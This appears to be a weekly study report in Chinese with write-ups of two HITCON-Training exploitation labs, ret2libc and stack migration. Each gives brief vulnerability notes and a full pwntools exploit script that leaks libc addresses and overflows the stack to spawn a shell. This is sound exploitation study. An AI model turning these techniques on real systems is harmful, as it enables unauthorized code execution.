# week1
## hitcon-training -- lab4(ret2lib)
没开保护

<img width="671" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/fcc194f1-bd6f-4239-a817-cd4c2333c96c">

有个任意地址泄漏

<img width="470" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/735ed291-3416-4df4-97f9-5461758fd114">

可以通过got表地址泄漏libc

<img width="496" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/e4a4b58a-22ab-4b9f-824b-79841f867ce4">

接下来的函数Print_message存在栈溢出 直接利用泄漏的libc打system

<img width="374" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/90f6f979-325c-4da5-81bf-bc73dd5f8747">

### exp_ret2lib.py

```python
from pwn import *
p = process("./ret2lib")
# p = remote("ip",port)
context.log_level = 'debug'
# context.arch = 'amd64'
# context(os="linux", arch="amd64",log_level = "debug")

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()

printf_got = '0x804a010'
printf_got_10 = int(printf_got, 16)

ru('(in dec) :')
sl(str(printf_got_10))


ru('address : ')
libc_printf = int(ru('\n').strip(),16)
log.info("libc_printf ==> {}".format(hex(libc_printf)))

off_printf = 0x502b0
off_binsh = 0x18e363
off_system = 0x41780
libc_base = libc_printf - off_printf
log.info("libc_base ==> {}".format(hex(libc_base)))

libc_system = libc_base + off_system
libc_binsh = libc_base + off_binsh

off = 60

payload = b'a' * off 
payload+= p32(libc_system)
payload+= p32(0xdeadbeef)
payload+= p32(libc_binsh)

# raw_input("Ther")
ru('me :')
sl(payload)

shell()
```

## hitcon-training -- lab6(migration)
32位没开保护

<img width="254" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/1a8835c7-e1d2-4281-ad1f-3165f878eede">

能溢出的空间有限 只有20个字节 转化成地址就是5个gadget地址 没法进行ROP
考虑进行栈迁移 获得更大的空间 但是将栈迁移后 我们还需要read的能力来进行构造在新栈执行的指令
所以需要用到read@plt 加上leave ret和read的3个参数，刚好5个gadget 即
```python
payload = flat([buf1, read_plt, leave_ret, 0, buf1, 0x100])
```
其中buf1为要迁移的新栈的地址，一般为bss段的中间部分
在执行read时，我们便可以往buf1中写入数据，这里选择了写入泄漏libc基地址的指令
```python
payload = flat([buf2, puts_plt, pop_ebx_ret, puts_got, read_plt, leave_ret, 0, buf2, 0x100])
```
在puts泄漏libc后，在通过一个read和leave ret把栈迁移到buf2上 此时read便可以把libc_system和libc_binsh写入到buf2中准备执行
再次leave ret时 就直接执行system("/bin/sh")

### exp_migration.py
```python
from pwn import *
p = process("./migration")
# p = remote("ip",port)
context.log_level = 'debug'
# context.arch = 'amd64'
# context(os="linux", arch="amd64",log_level = "debug")

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()

read_got = 0x8049fe8
puts_got = 0x8049ff0
off_puts = 0x6dc40
off_system = 0x41780
off_binsh = 0x18e363

read_plt = 0x8048380
puts_plt = 0x8048390

leave_ret = 0x08048418
pop_ebx_ret = 0x0804836d

bss = 0x804b000
buf1 = bss - 0x500
buf2 = bss - 0x300

offset = 40

payload = b'a' * offset
payload+= flat([buf1, read_plt, leave_ret, 0, buf1, 0x100])

ru(':\n')
s(payload)

payload = flat([buf2, puts_plt, pop_ebx_ret, puts_got, read_plt, leave_ret, 0, buf2, 0x100])
sleep(0.1)
raw_input("Ther")
sl(payload)

libc_puts = u32(rx(4))
log.info("libc_puts ==> {}".format(hex(libc_puts)))

libc_base = libc_puts - off_puts
log.info("libc_base ==> {}".format(hex(libc_base)))

libc_system = libc_base + off_system
libc_binsh = libc_base + off_binsh

payload = b'aaaa'
payload+= flat([libc_system, 0xdeadbeef, libc_binsh])

sleep(0.1)
raw_input("Ther")
sl(payload)

shell()
```
